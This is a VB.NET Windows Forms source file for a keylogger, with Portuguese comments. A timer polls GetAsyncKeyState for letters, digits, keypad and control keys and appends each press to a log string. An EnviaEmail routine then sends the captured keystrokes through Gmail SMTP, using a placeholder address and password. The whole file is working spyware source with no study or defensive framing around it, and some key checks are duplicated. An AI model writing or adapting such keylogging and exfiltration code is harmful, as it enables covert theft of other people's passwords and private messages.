Imports System.Net.Mail

Public Class frmEventos

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Public Log As String

    Private Sub frmEventos_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If (GetAsyncKeyState(65)) Then
            Log = Log + "A"
        ElseIf (GetAsyncKeyState(66)) Then
            Log = Log + "B"
        ElseIf (GetAsyncKeyState(67)) Then
            Log = Log + "C"
        ElseIf (GetAsyncKeyState(68)) Then
            Log = Log + "D"
        ElseIf (GetAsyncKeyState(69)) Then
            Log = Log + "E"
        ElseIf (GetAsyncKeyState(70)) Then
            Log = Log + "F"
        ElseIf (GetAsyncKeyState(71)) Then
            Log = Log + "G"
        ElseIf (GetAsyncKeyState(72)) Then
            Log = Log + "H"
        ElseIf (GetAsyncKeyState(73)) Then
            Log = Log + "I"
        ElseIf (GetAsyncKeyState(74)) Then
            Log = Log + "J"
        ElseIf (GetAsyncKeyState(75)) Then
            Log = Log + "K"
        ElseIf (GetAsyncKeyState(76)) Then
            Log = Log + "L"
        ElseIf (GetAsyncKeyState(77)) Then
            Log = Log + "M"
        ElseIf (GetAsyncKeyState(78)) Then
            Log = Log + "N"
        ElseIf (GetAsyncKeyState(79)) Then
            Log = Log + "O"
        ElseIf (GetAsyncKeyState(80)) Then
            Log = Log + "P"
        ElseIf (GetAsyncKeyState(81)) Then
            Log = Log + "Q"
        ElseIf (GetAsyncKeyState(82)) Then
            Log = Log + "R"
        ElseIf (GetAsyncKeyState(83)) Then
            Log = Log + "S"
        ElseIf (GetAsyncKeyState(84)) Then
            Log = Log + "T"
        ElseIf (GetAsyncKeyState(85)) Then
            Log = Log + "U"
        ElseIf (GetAsyncKeyState(86)) Then
            Log = Log + "V"
        ElseIf (GetAsyncKeyState(87)) Then
            Log = Log + "W"
        ElseIf (GetAsyncKeyState(88)) Then
            Log = Log + "X"
        ElseIf (GetAsyncKeyState(89)) Then
            Log = Log + "Y"
        ElseIf (GetAsyncKeyState(90)) Then
            Log = Log + "Z"
        ElseIf (GetAsyncKeyState(48)) Then 'numeros 1 a 9
            Log = Log + "0"
        ElseIf (GetAsyncKeyState(49)) Then
            Log = Log + "1"
        ElseIf (GetAsyncKeyState(50)) Then
            Log = Log + "2"
        ElseIf (GetAsyncKeyState(51)) Then
            Log = Log + "3"
        ElseIf (GetAsyncKeyState(52)) Then
            Log = Log + "4"
        ElseIf (GetAsyncKeyState(53)) Then
            Log = Log + "5"
        ElseIf (GetAsyncKeyState(54)) Then
            Log = Log + "6"
        ElseIf (GetAsyncKeyState(55)) Then
            Log = Log + "7"
        ElseIf (GetAsyncKeyState(56)) Then
            Log = Log + "8"
        ElseIf (GetAsyncKeyState(57)) Then 'fim numeros
            Log = Log + "9"
        ElseIf (GetAsyncKeyState(96)) Then 'teclado numerico
            Log = Log + "{0}"
        ElseIf (GetAsyncKeyState(97)) Then
            Log = Log + "{1}"
        ElseIf (GetAsyncKeyState(98)) Then
            Log = Log + "{2}"
        ElseIf (GetAsyncKeyState(99)) Then
            Log = Log + "{3}"
        ElseIf (GetAsyncKeyState(100)) Then
            Log = Log + "{4}"
        ElseIf (GetAsyncKeyState(101)) Then
            Log = Log + "{5}"
        ElseIf (GetAsyncKeyState(102)) Then
            Log = Log + "{6}"
        ElseIf (GetAsyncKeyState(103)) Then
            Log = Log + "{7}"
        ElseIf (GetAsyncKeyState(104)) Then
            Log = Log + "{8}"
        ElseIf (GetAsyncKeyState(105)) Then
            Log = Log + "{9}"
        ElseIf (GetAsyncKeyState(105)) Then ' fim teclado numerico
            Log = Log + "{9}"
        ElseIf (GetAsyncKeyState(106)) Then  ' operacoes *
            Log = Log + "{Num*}"
        ElseIf (GetAsyncKeyState(107)) Then
            Log = Log + "{Num+}"
        ElseIf (GetAsyncKeyState(13)) Then
            Log = Log + "{Enter}"
        ElseIf (GetAsyncKeyState(109)) Then
            Log = Log + "{Num-}"
        ElseIf (GetAsyncKeyState(110)) Then
            Log = Log + "{Num.}"
        ElseIf (GetAsyncKeyState(111)) Then 'fim operacoes /
            Log = Log + "{Num/}"
        ElseIf (GetAsyncKeyState(32)) Then
            Log = Log + " "
        ElseIf (GetAsyncKeyState(8)) Then
            Log = Log + "{Backspace}"
        ElseIf (GetAsyncKeyState(9)) Then
            Log = Log + "{Tab}"
        ElseIf (GetAsyncKeyState(16)) Then
            Log = Log + "{Shift}"
        ElseIf (GetAsyncKeyState(17)) Then
            Log = Log + "{Control}"
        ElseIf (GetAsyncKeyState(20)) Then
            Log = Log + "{Caps}"
        ElseIf (GetAsyncKeyState(27)) Then
            Log = Log + "{Esc}"
        ElseIf (GetAsyncKeyState(33)) Then
            Log = Log + "{PGup}"
        ElseIf (GetAsyncKeyState(34)) Then
            Log = Log + "{PGdn}"
        ElseIf (GetAsyncKeyState(35)) Then
            Log = Log + "{End}"
        ElseIf (GetAsyncKeyState(36)) Then
            Log = Log + "{Home}"
        ElseIf (GetAsyncKeyState(37)) Then
            Log = Log + "{LArrow}"
        ElseIf (GetAsyncKeyState(38)) Then
            Log = Log + "{UArrow}"
        ElseIf (GetAsyncKeyState(39)) Then
            Log = Log + "{RArrow}"
        ElseIf (GetAsyncKeyState(40)) Then
            Log = Log + "{DArrow}"
        ElseIf (GetAsyncKeyState(45)) Then
            Log = Log + "{Insert}"
        ElseIf (GetAsyncKeyState(46)) Then
            Log = Log + "{Del}"
        ElseIf (GetAsyncKeyState(144)) Then
            Log = Log + "{NumLock}"
        ElseIf (GetAsyncKeyState(188)) Then
            Log = Log + "{,}"
        ElseIf (GetAsyncKeyState(187)) Then
            Log = Log + "{=}"
        ElseIf (GetAsyncKeyState(186)) Then
            Log = Log + "{;}"
        ElseIf (GetAsyncKeyState(8)) Then
            Log = Log + "{BS}"
        ElseIf (GetAsyncKeyState(32)) Then
            Log = Log + "{ }"
        ElseIf (GetAsyncKeyState(112)) Then
            Log = Log + "{F1}"
        ElseIf (GetAsyncKeyState(113)) Then
            Log = Log + "{F2}"
        ElseIf (GetAsyncKeyState(114)) Then
            Log = Log + "{F3}"
        End If
    End Sub

    Private Sub btnMostrarLog_Click(sender As Object, e As EventArgs) Handles btnMostrarLog.Click
        rtb1.Text = Log
    End Sub

    Private Sub EnviaEmail()
        Try
            Dim Mail As New MailMessage
            Mail.Subject = "Keylog"
            Mail.To.Add("email@gmail.com")
            Mail.From = New MailAddress("email@gmail.com")
            Mail.Body = Log
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("email@gmail.com", "senha_email")
            SMTP.Port = "587"
            SMTP.Send(Mail)
        Catch ex As Exception
            MessageBox.Show("Erro: " + ex.Message)
        End Try
    End Sub
End Class
